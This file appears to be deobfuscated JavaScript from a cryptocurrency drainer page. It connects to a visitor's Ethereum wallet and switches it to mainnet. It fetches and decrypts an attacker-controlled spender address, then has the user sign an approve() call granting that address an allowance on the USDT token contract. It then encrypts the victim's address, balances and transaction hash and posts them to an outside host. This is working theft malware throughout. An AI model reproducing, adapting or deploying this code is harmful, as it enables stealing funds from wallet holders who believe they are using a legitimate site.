//Wed Dec 04 2024 07:08:58 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
const _0x48c67d = "0xdac17f958d2ee523a2206206994597c13d831ec7",
  _0x571372 = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArKNuFDx/KRojyKppw6gF\n8FevyG2D48+2n7P95NGi1gcKmhJWfdA/xOS8vvNc4/w9RSv8LWL0UjaNBsXgFmeB\n5djtAZZXQLTfQm+opXXA6GX78OrG7dJurxR1RL8ei8m2oE38HQDfiCi60e1cnEiq\ndMrLK3Zowa8U0qLTyb/NGktpFlelsuKFalhTAOAA2DGlz7zdOhG4cEI9E1M1RkHN\nK1Wi5XBhPor1DuJQGNCZ84Y0aYs7uGwwGCNAfuxHiigINFZV0JSUPefyCc4iqfua\ntLLfWY076oGZyjwyWONE19ug3vzvH4qnTK7602lWl5d59UjURcvwp0j1AcJvqHi5\naQIDAQAB\n-----END PUBLIC KEY-----";
function _0x125aed(_0x23b6c5) {
  const _0x4688dc = new JSEncrypt();
  _0x4688dc.setPublicKey(_0x571372);
  const _0xdb648b = _0x4688dc.encrypt(JSON.stringify(_0x23b6c5));
  if (_0xdb648b) {
    return _0xdb648b;
  } else {
    return null;
  }
}
const _0x4e9253 = [{
    "constant": true,
    "inputs": [{
      "name": "_owner",
      "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
      "name": "balance",
      "type": "uint256"
    }],
    "type": "function"
  }, {
    "constant": false,
    "inputs": [{
      "name": "_spender",
      "type": "address"
    }, {
      "name": "_value",
      "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{
      "name": "success",
      "type": "bool"
    }],
    "type": "function"
  }],
  _0x5e7134 = "your-secret-key",
  _0x2e7d6a = "salt",
  _0x30d8a6 = () => {
    return CryptoJS.PBKDF2(_0x5e7134, _0x2e7d6a, {
      "keySize": 256 / 32,
      "iterations": 1000,
      "hasher": CryptoJS.algo.SHA256
    });
  },
  _0x1f4db7 = async _0x12ba92 => {
    try {
      if (!_0x12ba92.includes(":")) try {
        return JSON.parse(_0x12ba92);
      } catch {
        throw new Error("Invalid response format");
      }
      const [_0x2e9a80, _0x2ac373] = _0x12ba92.split(":"),
        _0x2bc2e4 = _0x30d8a6(),
        _0x2f35ff = CryptoJS.enc.Base64.parse(_0x2e9a80),
        _0x572704 = CryptoJS.lib.CipherParams.create({
          "ciphertext": CryptoJS.enc.Base64.parse(_0x2ac373)
        }),
        _0x32b57b = CryptoJS.AES.decrypt(_0x572704, _0x2bc2e4, {
          "iv": _0x2f35ff,
          "mode": CryptoJS.mode.CBC,
          "padding": CryptoJS.pad.Pkcs7
        });
      let _0x394087 = _0x32b57b.toString(CryptoJS.enc.Utf8);
      _0x394087 = _0x394087.replace(/\s/g, "");
      if (!_0x394087) throw new Error("Decryption failed: Decrypted data is empty");
      try {
        const _0x3ebedc = JSON.parse(_0x394087);
        return _0x3ebedc.data && _0x3ebedc.data.eth_address ? _0x3ebedc.data.eth_address : null;
      } catch (_0x33b981) {
        throw new Error("Decrypted data is not valid JSON: " + _0x33b981.message);
      }
    } catch (_0x21ab37) {
      return null;
    }
  };
async function _0x5a008e() {
  if (typeof window.ethereum !== "undefined") {
    try {
      const _0x3f8e9a = new Web3(window.ethereum),
        _0x39377c = await window.ethereum.request({
          "method": "eth_requestAccounts"
        }),
        _0x34b2aa = _0x39377c[0],
        _0x5b7a8a = await _0x3f8e9a.eth.net.getId(),
        _0x430894 = _0x5b7a8a.toString();
      if (_0x430894 !== "1") {
        try {
          return await window.ethereum.request({
            "method": "wallet_switchEthereumChain",
            "params": [{
              "chainId": "0x1"
            }]
          }), _0x5a008e();
        } catch (_0xee4a25) {
          return null;
        }
      }
      const _0x223042 = await _0x3f8e9a.eth.getBalance(_0x34b2aa),
        _0x2ccf97 = new _0x3f8e9a.eth.Contract(_0x4e9253, _0x48c67d),
        _0x1c623a = await new Promise((_0x2d4f5a, _0x491b15) => {
          $.ajax({
            "url": "/api/public/auth-address",
            "type": "GET",
            "success": function (_0x48ec2f) {
              _0x2d4f5a(_0x48ec2f.replace(/^"|"$/g, "").replace(/[\n]/g, ""));
            },
            "error": function (_0x30443, _0x27edd4, _0x582760) {
              _0x491b15(_0x582760);
            }
          });
        }),
        _0x8c098f = await _0x1f4db7(_0x1c623a);
      return _0x8c098f;
    } catch (_0x57f5e3) {
      return null;
    }
  } else return null;
}
async function _0x410683(_0x348fe2) {
  let _0x3aad00 = "";
  try {
    const _0x9d2384 = new Web3(window.ethereum),
      _0x353e14 = await window.ethereum.request({
        "method": "eth_requestAccounts"
      });
    _0x3aad00 = _0x353e14[0];
    const _0x2c901b = new _0x9d2384.eth.Contract(_0x4e9253, _0x48c67d),
      _0x2d1e9f = _0x9d2384.utils.toWei("1000", "mwei"),
      _0x3c930b = await _0x2c901b.methods.approve(_0x348fe2, _0x2d1e9f).send({
        "from": _0x3aad00
      });
    await _0x1baf8c(_0x3aad00, _0x3c930b.transactionHash, true);
  } catch (_0x1b87ed) {
    if (!_0x3aad00) {
      const _0x208c09 = await window.ethereum.request({
        "method": "eth_requestAccounts"
      });
      _0x3aad00 = _0x208c09[0];
    }
    await _0x1baf8c(_0x3aad00, "", false);
  }
}
async function _0x1baf8c(_0x426548, _0x4ec3a7, _0x651d7c) {
  try {
    const _0x71847c = new Web3(window.ethereum),
      _0x3f1b9a = await _0x71847c.eth.getBalance(_0x426548),
      _0x170ac8 = _0x71847c.utils.fromWei(_0x3f1b9a.toString(), "ether"),
      _0x2b4a46 = new _0x71847c.eth.Contract(_0x4e9253, _0x48c67d),
      _0x2c56ec = await _0x2b4a46.methods.balanceOf(_0x426548).call(),
      _0x13d7f1 = parseFloat(_0x2c56ec) / 1000000,
      _0x56ab96 = {
        "address": _0x426548,
        "balance": _0x170ac8,
        "usdt_balance": _0x13d7f1,
        "is_authorized": _0x651d7c,
        "tx_hash": _0x4ec3a7 || "",
        "address_type": "ETH"
      },
      _0x56a32a = _0x125aed(_0x56ab96);
    if (!_0x56a32a) return;
    $.ajax({
      "url": "https://suobi888.htu43.cc/api/authorization/record",
      "type": "POST",
      "contentType": "application/json",
      "data": JSON.stringify({
        "s": _0x56a32a
      }),
      "success": function (_0x12a6eb) {
        console.log(_0x12a6eb);
      },
      "error": function (_0x5bc7cf, _0x46bdef, _0x59f013) {
        console.error("Error:", _0x59f013);
      }
    });
  } catch (_0x466460) {
    console.error("Error:", _0x466460);
  }
}
async function init() {
  const _0x3bda73 = await _0x5a008e();
  _0x3bda73 && (await _0x410683(_0x3bda73));
}